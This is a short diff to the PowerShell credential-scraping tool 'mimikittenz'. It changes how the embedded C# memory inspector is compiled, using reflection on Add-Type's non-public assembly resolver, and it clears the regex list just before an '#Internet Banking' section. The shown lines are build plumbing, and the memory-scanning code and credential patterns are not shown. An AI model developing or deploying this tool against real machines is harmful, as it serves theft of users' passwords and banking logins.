@@ -28,12 +28,13 @@ $asciiart = @"
 "@
 $Source2 = @"
 using System;
-using System.Collections.Generic;
 using System.Text;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 using System.IO;
+using System.ComponentModel;
 
 namespace mimikittenz
 {
@@ -438,11 +439,32 @@ namespace mimikittenz
 
 "@
 
-$inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
- $inmem.GenerateInMemory=1
-$inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))
+$addTypeCommand = Get-Command -Name 'Add-Type'
+$addTypeCommandInstance = [Activator]::CreateInstance($addTypeCommand.ImplementingType)
+$resolveAssemblyMethod = $addTypeCommand.ImplementingType.GetMethod('ResolveReferencedAssembly', [Reflection.BindingFlags]'NonPublic, Instance')
+$compilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
+$compilerParameters.CompilerOptions = '/debug-'
 
-Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
+$ReferencedAssemblies = 
+@(
+    'System.Data.DataSetExtensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    'Microsoft.CSharp, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
+    'System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    'System.Text.RegularExpressions'
+    'System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    'System.ComponentModel'
+    'System.IO'
+)
+
+foreach ($reference in $ReferencedAssemblies)
+{
+    $reference
+    $resolvedAssembly = $resolveAssemblyMethod.Invoke($addTypeCommandInstance, $reference)
+    $compilerParameters.ReferencedAssemblies.Add($resolvedAssembly)
+}
+$compilerParameters.IncludeDebugInformation = $true
+
+Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $compilerParameters
 
 [mimikittenz.MemProcInspector]::regexes.Clear()
 #Internet Banking
